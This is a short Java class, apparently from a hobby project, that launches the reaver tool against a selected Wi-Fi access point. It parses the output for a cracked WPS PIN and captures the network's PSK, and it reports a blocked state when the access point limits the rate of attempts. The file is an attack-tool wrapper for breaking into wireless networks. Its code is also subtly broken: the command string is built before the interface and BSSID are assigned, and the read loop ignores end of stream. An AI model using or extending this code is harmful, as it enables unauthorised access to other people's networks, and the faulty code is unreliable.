package comunication;

import accessPoint.AccessPoint;
import adapter.Adapter;

import java.awt.event.KeyEvent;
import java.io.*;
import java.util.List;

/**
 * Created by georgipavlov on 18.03.16.
 */
public class StateProducer  {
    private String BSSID;
    private String SSID;
    private String ch;
    private String MON_X;
    private AccessPoint currentAP;
    private Adapter adapter;
    private String COMMAND = "sudo reaver -i " + MON_X +" -b " + BSSID +  " -vv";
    private String EXIT_REAVER = "^C";
    private String PSK;
    private String PIN;
    private List<AccessPoint> APs;


    public StateProducer(List<AccessPoint> accessPoints , Adapter adapter){
        this.currentAP = accessPoints.get(0);
        this.adapter = adapter;
        this.APs = accessPoints;
        initRaever();
    }

    public  void initRaever(){
        BSSID = currentAP.getBssid();
        SSID = currentAP.getEssid();
        ch = currentAP.getChanel();
        MON_X = adapter.getInterface();
    }

    public StatePakage startReaver() throws IOException {
       Process p = Runtime.getRuntime().exec(COMMAND);
        BufferedWriter writer =
                new BufferedWriter(new OutputStreamWriter(p.getOutputStream()));
        writer.write(KeyEvent.VK_ENTER);
        BufferedReader reader =
                new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line = null;
        int resultValue;
        while (true){
            line = reader.readLine();
           if(line.contains("AP rate limiting detected")){
               resultValue=1;
               break;
           }else if(line.contains("Pin cracked")){
               resultValue=2;
               PIN = reader.readLine();
               PSK = reader.readLine();
               break;
           }
        }
        writer.write(EXIT_REAVER);
        writer.close();
        reader.close();


        switch (resultValue){
            case 1:{
                return new StatePakage(StatePakage.State.BLOKED,null,null,adapter,APs);
            }case 2:{
                return new StatePakage(StatePakage.State.FINISHED,PIN,PSK,adapter,APs);
            }
        }
        return null;
    }

}
